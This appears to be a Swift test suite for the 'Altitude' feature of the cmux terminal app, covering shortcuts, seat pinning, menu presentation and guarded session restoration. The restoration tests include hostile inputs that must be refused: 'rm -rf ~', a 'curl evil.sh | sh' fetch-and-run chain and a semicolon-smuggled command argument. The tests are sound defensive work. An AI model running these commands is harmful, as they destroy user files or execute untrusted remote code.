import AppKit
import Foundation
import Testing

#if canImport(cmux_DEV)
@testable import cmux_DEV
#elseif canImport(cmux)
@testable import cmux
#endif

@Suite("Altitude presence stages")
struct AltitudePresenceStageTests {
    private func configuration(brighten: Int = 120, pulse: Int = 300) -> AltitudeConfiguration {
        let defaults = UserDefaults(suiteName: "AltitudePresenceStageTests.\(UUID().uuidString)")!
        defaults.set(brighten, forKey: AltitudeConfiguration.readyBrightenSecondsKey)
        defaults.set(pulse, forKey: AltitudeConfiguration.pulseSecondsKey)
        return AltitudeConfiguration(defaults: defaults)
    }

    @Test("1A advances through all three stages")
    func priority1AStages() {
        let config = configuration()
        #expect(AltitudePresenceStage.resolve(waitSeconds: 0, priority: "1A", configuration: config) == .ready)
        #expect(AltitudePresenceStage.resolve(waitSeconds: 120, priority: "1A", configuration: config) == .bright)
        #expect(AltitudePresenceStage.resolve(waitSeconds: 300, priority: "1A", configuration: config) == .pulse)
    }

    @Test("1B never enters the pulse stage")
    func priority1BStopsAtBright() {
        let config = configuration()
        #expect(AltitudePresenceStage.resolve(waitSeconds: 600, priority: "1B", configuration: config) == .bright)
    }

    @Test("thresholds are configurable dials")
    func configurableThresholds() {
        let config = configuration(brighten: 5, pulse: 10)
        #expect(AltitudePresenceStage.resolve(waitSeconds: 5, priority: "1A", configuration: config) == .bright)
        #expect(AltitudePresenceStage.resolve(waitSeconds: 10, priority: "1A", configuration: config) == .pulse)
    }
}

@Suite("Altitude office surface matching")
struct AltitudeOfficeSurfaceMatcherTests {
    @Test("office attach process arguments identify the Studio session")
    func officeAttachArgumentsMatch() {
        let sessionID = "c5017c5d-e034-43da-8834-eb21479f8256"
        let evidence = AltitudeSurfaceEvidence(
            title: "[mosh] xianxing-altitude-third-pane",
            processArgumentVectors: [
                [
                    "node",
                    "/Users/teren/pcl-client/office/dist/index.js",
                    "a",
                    sessionID,
                ],
            ]
        )

        #expect(AltitudeSurfaceMatcher.matches(sessionIDs: [sessionID], tmuxSession: nil, evidence: evidence))
    }

    @Test("mosh tab title identifies the Studio tmux session")
    func moshTitleMatches() {
        let evidence = AltitudeSurfaceEvidence(
            title: "[mosh] xianxing-altitude-third-pane",
            processArgumentVectors: []
        )

        #expect(AltitudeSurfaceMatcher.matches(
            sessionIDs: [],
            tmuxSession: "xianxing-altitude-third-pane",
            evidence: evidence
        ))
    }

    @Test("partial identifiers do not create a false match")
    func partialIdentifierDoesNotMatch() {
        let evidence = AltitudeSurfaceEvidence(
            title: "[mosh] xianxing-altitude-third-pane-old",
            bindingText: ["tmux attach -t xianxing-altitude-third-pane-old"],
            processArgumentVectors: [["node", "office/dist/index.js", "a", "c5017c5d-old"]]
        )

        #expect(!AltitudeSurfaceMatcher.matches(
            sessionIDs: ["c5017c5d"],
            tmuxSession: "xianxing-altitude-third-pane",
            evidence: evidence
        ))
    }

    @Test("a bare process argument is not mistaken for an office attachment")
    func bareProcessArgumentDoesNotMatch() {
        let sessionID = "c5017c5d-e034-43da-8834-eb21479f8256"
        let evidence = AltitudeSurfaceEvidence(
            title: "unrelated",
            processArgumentVectors: [["node", "script.js", "--label", sessionID]]
        )

        #expect(!AltitudeSurfaceMatcher.matches(sessionIDs: [sessionID], tmuxSession: nil, evidence: evidence))
    }
}

@Suite("Altitude seat pinning")
struct AltitudeSeatPinningTests {
    @Test("another tab is refused from an occupied seat pane")
    func occupiedSeatRefusesOtherSurface() {
        let seatSurface = UUID()
        let incomingSurface = UUID()

        #expect(
            AltitudeSeatMovePolicy.decision(
                movingSurfaceID: incomingSurface,
                sourceSeatSurfaceID: nil,
                destinationSeatSurfaceID: seatSurface
            ) == .offerReanoint
        )
        #expect(
            AltitudeSeatMovePolicy.decision(
                movingSurfaceID: seatSurface,
                sourceSeatSurfaceID: seatSurface,
                destinationSeatSurfaceID: seatSurface
            ) == .allow
        )
        #expect(
            AltitudeSeatMovePolicy.decision(
                movingSurfaceID: incomingSurface,
                sourceSeatSurfaceID: nil,
                destinationSeatSurfaceID: nil
            ) == .allow
        )
    }


    @Test("an anointed tab cannot leave its seat pane")
    func anointedSurfaceRefusesMoveOut() {
        let seatSurface = UUID()
        #expect(
            AltitudeSeatMovePolicy.decision(
                movingSurfaceID: seatSurface,
                sourceSeatSurfaceID: seatSurface,
                destinationSeatSurfaceID: nil
            ) == .refuseAnointedSeatMove
        )
    }

    @Test("re-anointing the other seat swaps the roles")
    func reanointSwapsRoles() {
        let lead = UUID()
        let understudy = UUID()
        var configuration = PcLPrioritySwitcherConfiguration(
            leadSurfaceId: lead,
            understudySurfaceId: understudy
        )

        configuration.assign(role: .lead, surfaceId: understudy)

        #expect(configuration.leadSurfaceId == understudy)
        #expect(configuration.understudySurfaceId == lead)
    }
}


@Suite("Altitude command palette corpus")
struct AltitudeCommandPaletteCorpusTests {
    @Test("an empty query shows Altitude priority and needs-you entries")
    func emptyQueryShowsAltitudeEntries() {
        let entries = AltitudePaletteCorpus.orderedEntries(
            query: "  ",
            priorityEntries: ["priority"],
            needsYouEntries: ["needs-you"]
        )
        #expect(entries == ["priority", "needs-you"])
    }

    @Test("a typed query removes Altitude-only entries from the original switcher corpus")
    func typedQueryUsesOriginalCorpus() {
        let entries = AltitudePaletteCorpus.orderedEntries(
            query: "needs teren",
            priorityEntries: ["priority"],
            needsYouEntries: ["needs-you"]
        )
        #expect(entries.isEmpty)
    }
}

@Suite("Altitude priority shortcuts")
struct AltitudePriorityShortcutTests {
    @Test("command one and command two route to the two priority seats")
    func routesPrioritySeats() {
        #expect(AltitudePriorityShortcut.priority(
            isAltitudeEnabled: true,
            characters: "1",
            keyCode: 18,
            modifierFlags: [.command],
            textInputOwnsEvent: false
        ) == "1A")
        #expect(AltitudePriorityShortcut.priority(
            isAltitudeEnabled: true,
            characters: "2",
            keyCode: 19,
            modifierFlags: [.command],
            textInputOwnsEvent: false
        ) == "1B")
        #expect(AltitudePriorityShortcut.hint(for: "1A") == "⌘1")
        #expect(AltitudePriorityShortcut.hint(for: "1B") == "⌘2")
    }

    @Test("vanilla, modified chords, and text input retain existing behavior")
    func preservesExistingRoutingOutsideAltitude() {
        #expect(AltitudePriorityShortcut.priority(
            isAltitudeEnabled: false,
            characters: "1",
            keyCode: 18,
            modifierFlags: [.command],
            textInputOwnsEvent: false
        ) == nil)
        #expect(AltitudePriorityShortcut.priority(
            isAltitudeEnabled: true,
            characters: "1",
            keyCode: 18,
            modifierFlags: [.command, .option],
            textInputOwnsEvent: false
        ) == nil)
        #expect(AltitudePriorityShortcut.priority(
            isAltitudeEnabled: true,
            characters: "1",
            keyCode: 18,
            modifierFlags: [.command],
            textInputOwnsEvent: true
        ) == nil)
    }

    @Test("priority shortcuts focus the globally anointed surfaces directly")
    func globallyFocusesAnointedSurfaces() {
        let lead = UUID()
        let understudy = UUID()
        let configuration = PcLPrioritySwitcherConfiguration(
            leadSurfaceId: lead,
            understudySurfaceId: understudy
        )

        #expect(AltitudePriorityFocusTarget.surfaceID(for: "1A", configuration: configuration) == lead)
        #expect(AltitudePriorityFocusTarget.surfaceID(for: "1B", configuration: configuration) == understudy)
        #expect(AltitudePriorityFocusTarget.surfaceID(for: "2", configuration: configuration) == nil)
    }
}

@Suite("Altitude office attach restoration")
struct AltitudeOfficeAttachResumeTests {
    @Test("the exact office attach command becomes a process-detected resume binding")
    func recognizesOfficeAttach() throws {
        let sessionID = "c5017c5d-e034-43da-8834-eb21479f8256"
        let binding = try #require(AltitudeOfficeAttachResumeParser.binding(
            processName: "node",
            processPath: "/opt/homebrew/bin/node",
            arguments: [
                "/opt/homebrew/bin/node",
                "/Users/teren/pcl-client/office/dist/index.js",
                "a",
                sessionID,
            ],
            environment: ["PWD": "/Users/teren"],
            homeDirectory: "/Users/teren",
            isEnabled: true,
            capturedAt: 1_777_777_777
        ))

        #expect(binding.kind == "altitude-office-attach")
        #expect(binding.checkpointId == sessionID)
        #expect(binding.source == "process-detected")
        #expect(binding.autoResume == true)
        #expect(binding.command.contains("/Users/teren/pcl-client/office/dist/index.js"))
        #expect(binding.command.contains(sessionID))
    }

    @Test("arbitrary node commands and disabled restore are never replayed")
    func rejectsUnrecognizedCommands() {
        let commonArguments = [
            "node",
            "/Users/teren/pcl-client/office/dist/index.js",
            "a",
            "c5017c5d-e034-43da-8834-eb21479f8256",
        ]
        #expect(AltitudeOfficeAttachResumeParser.binding(
            processName: "node",
            processPath: nil,
            arguments: ["node", "/Users/teren/scripts/anything.js", "a", "session"],
            environment: [:],
            homeDirectory: "/Users/teren",
            isEnabled: true,
            capturedAt: 1
        ) == nil)
        #expect(AltitudeOfficeAttachResumeParser.binding(
            processName: "python",
            processPath: nil,
            arguments: commonArguments,
            environment: [:],
            homeDirectory: "/Users/teren",
            isEnabled: true,
            capturedAt: 1
        ) == nil)
        #expect(AltitudeOfficeAttachResumeParser.binding(
            processName: "node",
            processPath: nil,
            arguments: ["node", "/Users/teren/pcl-client/office/dist/index.js", "run", "session"],
            environment: [:],
            homeDirectory: "/Users/teren",
            isEnabled: true,
            capturedAt: 1
        ) == nil)
        #expect(AltitudeOfficeAttachResumeParser.binding(
            processName: "node",
            processPath: nil,
            arguments: ["node", "/Users/teren/pcl-client/office/dist/index.js", "a", "session;echo unsafe"],
            environment: [:],
            homeDirectory: "/Users/teren",
            isEnabled: true,
            capturedAt: 1
        ) == nil)
        #expect(AltitudeOfficeAttachResumeParser.binding(
            processName: "node",
            processPath: nil,
            arguments: commonArguments,
            environment: [:],
            homeDirectory: "/Users/teren",
            isEnabled: false,
            capturedAt: 1
        ) == nil)
    }

    @Test("office attach restoration defaults on and has an off dial")
    func configurationDial() {
        let defaults = UserDefaults(suiteName: "AltitudeOfficeAttachResumeTests.\(UUID().uuidString)")!
        #expect(AltitudeConfiguration(defaults: defaults).restoreOfficeAttaches)
        defaults.set(false, forKey: AltitudeConfiguration.restoreOfficeAttachesKey)
        #expect(!AltitudeConfiguration(defaults: defaults).restoreOfficeAttaches)
    }

    @Test("captured office bindings are gated again at execution time")
    func restoreExecutionGate() {
        #expect(AltitudeOfficeAttachResumePolicy.allowsRestore(
            bindingKind: "altitude-office-attach",
            isAltitudeEnabled: true,
            restoreOfficeAttaches: true
        ))
        #expect(!AltitudeOfficeAttachResumePolicy.allowsRestore(
            bindingKind: "altitude-office-attach",
            isAltitudeEnabled: true,
            restoreOfficeAttaches: false
        ))
        #expect(!AltitudeOfficeAttachResumePolicy.allowsRestore(
            bindingKind: "altitude-office-attach",
            isAltitudeEnabled: false,
            restoreOfficeAttaches: true
        ))
        #expect(AltitudeOfficeAttachResumePolicy.allowsRestore(
            bindingKind: "tmux",
            isAltitudeEnabled: false,
            restoreOfficeAttaches: false
        ))
    }

    // Wiring-level coverage: these call the REAL restore path
    // (Workspace.resumeBindingForSessionRestore), so they fail if the
    // altitude gate block or the replay-time re-validation is deleted —
    // the pure-function tests above cannot catch that.
    private func officeBinding(command: String, checkpointId: String? = "kleya-hive-drive") -> SurfaceResumeBindingSnapshot {
        SurfaceResumeBindingSnapshot(
            name: "Office kleya-hive-drive",
            kind: AltitudeOfficeAttachResumePolicy.bindingKind,
            command: command,
            checkpointId: checkpointId,
            source: "process-detected",
            autoResume: true,
            updatedAt: 0
        )
    }
    private let home = "/Users/teren"
    private var goodCommand: String {
        "'node' '/Users/teren/pcl-client/office/dist/index.js' 'a' 'kleya-hive-drive'"
    }

    @Test("restore wiring passes a recognized office binding through")
    func restoreWiringAllowsRecognized() {
        let binding = officeBinding(command: goodCommand)
        let restored = Workspace.resumeBindingForSessionRestore(
            binding, restorableAgent: nil,
            isAltitudeEnabled: true, restoreOfficeAttaches: true, homeDirectory: home
        )
        #expect(restored == binding)
    }

    @Test("restore wiring refuses a tampered stored command")
    func restoreWiringRefusesTamperedCommand() {
        for bad in [
            "rm -rf ~",
            "'node' '/Users/teren/pcl-client/office/dist/index.js' 'a' 'x' && curl evil.sh | sh",
            "'python3' '/Users/teren/pcl-client/office/dist/index.js' 'a' 'kleya-hive-drive'",
            "'node' '/tmp/evil.js' 'a' 'kleya-hive-drive'",
        ] {
            let restored = Workspace.resumeBindingForSessionRestore(
                officeBinding(command: bad), restorableAgent: nil,
                isAltitudeEnabled: true, restoreOfficeAttaches: true, homeDirectory: home
            )
            #expect(restored == nil, "must refuse: \(bad)")
        }
    }

    @Test("restore wiring refuses a checkpoint/session mismatch")
    func restoreWiringRefusesCheckpointMismatch() {
        let restored = Workspace.resumeBindingForSessionRestore(
            officeBinding(command: goodCommand, checkpointId: "some-other-session"),
            restorableAgent: nil,
            isAltitudeEnabled: true, restoreOfficeAttaches: true, homeDirectory: home
        )
        #expect(restored == nil)
    }

    @Test("restore wiring honors the disable dial and the Altitude gate")
    func restoreWiringHonorsGates() {
        let binding = officeBinding(command: goodCommand)
        #expect(Workspace.resumeBindingForSessionRestore(
            binding, restorableAgent: nil,
            isAltitudeEnabled: true, restoreOfficeAttaches: false, homeDirectory: home
        ) == nil)
        #expect(Workspace.resumeBindingForSessionRestore(
            binding, restorableAgent: nil,
            isAltitudeEnabled: false, restoreOfficeAttaches: true, homeDirectory: home
        ) == nil)
    }

    @Test("non-altitude bindings are untouched by the altitude gate")
    func restoreWiringLeavesVanillaAlone() {
        let vanilla = SurfaceResumeBindingSnapshot(
            name: "tmux main", kind: "tmux", command: "tmux attach -t main",
            checkpointId: nil, source: "process-detected", autoResume: true, updatedAt: 0
        )
        let restored = Workspace.resumeBindingForSessionRestore(
            vanilla, restorableAgent: nil,
            isAltitudeEnabled: false, restoreOfficeAttaches: false, homeDirectory: home
        )
        #expect(restored == vanilla)
    }
}

@Suite("Altitude menu presentation")
struct AltitudeMenuPresentationTests {
    private func item(
        id: String,
        tmuxSession: String?,
        why: String = "Waiting for a decision on the reader controls"
    ) -> AltitudeNextUpItem {
        AltitudeNextUpItem(
            agentId: "xianxing",
            agentName: "Xing",
            sessionId: id,
            jumpSessionId: id,
            tmuxSession: tmuxSession,
            priority: nil,
            classification: "actionable",
            why: .init(label: "needs you", confidence: 1, line: why),
            waitingSince: "2026-08-01T20:00:00Z",
            waitSeconds: 300
        )
    }

    @Test("the menu always targets the third pane with a last-pane fallback")
    func targetPaneIndex() {
        #expect(AltitudeMenuPresentation.targetPaneIndex(paneCount: 0) == nil)
        #expect(AltitudeMenuPresentation.targetPaneIndex(paneCount: 1) == 0)
        #expect(AltitudeMenuPresentation.targetPaneIndex(paneCount: 2) == 1)
        #expect(AltitudeMenuPresentation.targetPaneIndex(paneCount: 3) == 2)
        #expect(AltitudeMenuPresentation.targetPaneIndex(paneCount: 5) == 2)
    }

    @Test("command zero opens only outside AppKit text input")
    func commandZeroShortcut() {
        #expect(AltitudeMenuShortcut.matches(
            isAltitudeEnabled: true,
            characters: "0",
            keyCode: 29,
            modifierFlags: [.command],
            textInputOwnsEvent: false
        ))
        #expect(!AltitudeMenuShortcut.matches(
            isAltitudeEnabled: true,
            characters: "0",
            keyCode: 29,
            modifierFlags: [.command],
            textInputOwnsEvent: true
        ))
        #expect(!AltitudeMenuShortcut.matches(
            isAltitudeEnabled: false,
            characters: "0",
            keyCode: 29,
            modifierFlags: [.command],
            textInputOwnsEvent: false
        ))
        #expect(AltitudeMenuShortcut.matches(
            isAltitudeEnabled: true,
            characters: "0",
            keyCode: 29,
            modifierFlags: [.command, .capsLock, .numericPad],
            textInputOwnsEvent: false
        ))
    }

    @Test("presented-menu keys yield to AppKit text input")
    func menuNavigationRespectsTextInput() {
        #expect(AltitudeMenuNavigationAction.resolve(
            isPresented: true,
            keyCode: 125,
            modifierFlags: [],
            textInputOwnsEvent: false
        ) == .move(1))
        #expect(AltitudeMenuNavigationAction.resolve(
            isPresented: true,
            keyCode: 36,
            modifierFlags: [],
            textInputOwnsEvent: false
        ) == .submit)
        #expect(AltitudeMenuNavigationAction.resolve(
            isPresented: true,
            keyCode: 53,
            modifierFlags: [],
            textInputOwnsEvent: false
        ) == .dismiss)
        #expect(AltitudeMenuNavigationAction.resolve(
            isPresented: true,
            keyCode: 36,
            modifierFlags: [],
            textInputOwnsEvent: true
        ) == nil)
    }

    @Test("anointed title prefixes replace rather than stack and clear cleanly")
    func anointedTabTitles() {
        let panelID = UUID()
        #expect(AltitudeSeatTitle.resolved(baseTitle: "edna-tgg", role: "1A") == "[1A] edna-tgg")
        #expect(AltitudeSeatTitle.resolved(baseTitle: "[1A] edna-tgg", role: "1B") == "[1B] edna-tgg")
        #expect(AltitudeSeatTitle.resolved(baseTitle: "[1B] edna-tgg", role: nil) == "edna-tgg")
        #expect(AltitudeSeatTitle.role(
            isAltitudeEnabled: true,
            panelID: panelID,
            leadSurfaceID: panelID,
            understudySurfaceID: nil
        ) == "1A")
        #expect(AltitudeSeatTitle.role(
            isAltitudeEnabled: false,
            panelID: panelID,
            leadSurfaceID: panelID,
            understudySurfaceID: nil
        ) == nil)
    }

    @Test("main sessions are excluded and the oldest eligible wait is emphasized")
    func filtersMainsAndFindsOldest() throws {
        let snapshot = AltitudeNextUpSnapshot(
            schemaVersion: 1,
            collectedAt: "2026-08-01T20:05:00Z",
            items: [
                item(id: "main", tmuxSession: "xianxing-main-teren"),
                item(id: "newer", tmuxSession: "xianxing-altitude-third-pane"),
                AltitudeNextUpItem(
                    agentId: "edna", agentName: "Edna", sessionId: "oldest",
                    jumpSessionId: "oldest", tmuxSession: "edna-tgg", priority: nil,
                    classification: "actionable",
                    why: .init(label: "needs you", confidence: 1, line: "Choose A or B"),
                    waitingSince: "2026-08-01T19:00:00Z", waitSeconds: 3_900
                ),
            ],
            processingCount: 4,
            idleCount: 2,
            processing: []
        )

        let rows = AltitudeMenuPresentation.needsYouItems(snapshot: snapshot)
        #expect(rows.map(\.sessionId) == ["newer", "oldest"])
        #expect(AltitudeMenuPresentation.oldestWaitingID(in: rows) == "oldest")
    }

    @Test("moving selection replaces the inline expansion")
    func selectionMovesAndCollapsesPrevious() {
        let rows = [
            item(id: "one", tmuxSession: "one"),
            item(id: "two", tmuxSession: "two"),
            item(id: "three", tmuxSession: "three"),
        ]
        #expect(AltitudeMenuPresentation.movedSelection(currentID: nil, delta: 1, items: rows) == "one")
        #expect(AltitudeMenuPresentation.movedSelection(currentID: "one", delta: 1, items: rows) == "two")
        #expect(AltitudeMenuPresentation.movedSelection(currentID: "one", delta: -1, items: rows) == "three")
    }

    @Test("arrival reports one consequential resolver delta and omits stable snapshots")
    func arrivalDelta() throws {
        let prior = AltitudeNextUpSnapshot(
            schemaVersion: 1, collectedAt: "before",
            items: [item(id: "finished", tmuxSession: "kleya-hive-drive")],
            processingCount: 1, idleCount: 0, processing: []
        )
        let current = AltitudeNextUpSnapshot(
            schemaVersion: 1, collectedAt: "after",
            items: [item(id: "waiting", tmuxSession: "edna-tgg")],
            processingCount: 1, idleCount: 0, processing: []
        )
        let delta = try #require(AltitudeMenuPresentation.arrival(previous: prior, current: current))
        #expect(delta.kind == .finished)
        #expect(delta.sessionName == "kleya-hive-drive")
        #expect(AltitudeMenuPresentation.arrival(previous: current, current: current) == nil)
    }

    @Test("live resolver updates refresh arrival, selection, and workspace dismissal")
    func interactionStateTracksLiveChanges() throws {
        let prior = AltitudeNextUpSnapshot(
            schemaVersion: 1, collectedAt: "before",
            items: [item(id: "finished", tmuxSession: "kleya-hive-drive")],
            processingCount: 1, idleCount: 0, processing: []
        )
        let current = AltitudeNextUpSnapshot(
            schemaVersion: 1, collectedAt: "after",
            items: [item(id: "waiting", tmuxSession: "edna-tgg")],
            processingCount: 1, idleCount: 0, processing: []
        )
        var state = AltitudeMenuInteractionState()
        state.open(snapshot: prior, now: Date(timeIntervalSince1970: 10))
        state.update(snapshot: current, previous: prior, now: Date(timeIntervalSince1970: 20))
        #expect(state.arrival?.kind == .finished)
        #expect(state.selectedItemID == "waiting")
        #expect(state.previousSnapshot == current)

        state.workspaceDidChange()
        #expect(!state.isPresented)
        #expect(state.selectedItemID == nil)
    }

    @Test("quiet durations do not render the wait-state word now")
    func localizedDurationKindsRemainDistinct() {
        #expect(AltitudeMenuDurationLabel.quiet(0) != AltitudeMenuDurationLabel.waiting(0))
        #expect(!AltitudeMenuDurationLabel.quiet(0).isEmpty)
        #expect(!AltitudeMenuDurationLabel.waiting(3_600).isEmpty)
    }
}

@MainActor
@Suite("Altitude window overlay interaction")
struct AltitudeWindowOverlayInteractionTests {
    @Test("the flipped container only captures the full menu pane")
    func measuredHitRegion() {
        let container = PassthroughWindowOverlayContainerView(frame: CGRect(x: 0, y: 0, width: 1_000, height: 800))
        container.interactiveRect = CGRect(x: 532, y: 540, width: 468, height: 200)

        #expect(container.isFlipped)
        #expect(container.hitTest(CGPoint(x: 700, y: 600)) === container)
        #expect(container.hitTest(CGPoint(x: 700, y: 100)) == nil)
    }

    @Test("the altitude container is promoted above terminal portal hosts")
    func overlayPromotesAbovePortalHost() throws {
        let parent = NSView(frame: CGRect(x: 0, y: 0, width: 1_000, height: 800))
        let reference = NSView(frame: parent.bounds)
        let overlay = PassthroughWindowOverlayContainerView(frame: parent.bounds)
        let portal = WindowTerminalHostView(frame: parent.bounds)
        parent.addSubview(reference)
        parent.addSubview(overlay, positioned: .above, relativeTo: reference)
        parent.addSubview(portal, positioned: .above, relativeTo: reference)

        WindowTmuxWorkspacePaneOverlayController.promoteAbovePortalHosts(containerView: overlay, in: parent)

        let overlayIndex = try #require(parent.subviews.firstIndex(of: overlay))
        let portalIndex = try #require(parent.subviews.firstIndex(of: portal))
        #expect(overlayIndex > portalIndex)
    }

    @Test("authoritative menu state survives a temporarily missing target rect")
    func authoritativePresentationFlag() {
        let state = TmuxWorkspacePaneOverlayRenderState(
            workspaceId: UUID(),
            unreadRects: [],
            flashRect: nil,
            flashToken: 0,
            flashReason: nil,
            altitudeMenu: nil,
            altitudeTargetRect: nil,
            altitudeMenuIsPresented: true
        )
        #expect(state.altitudeMenuIsPresented)
        #expect(state.altitudeMenu == nil)
    }
}
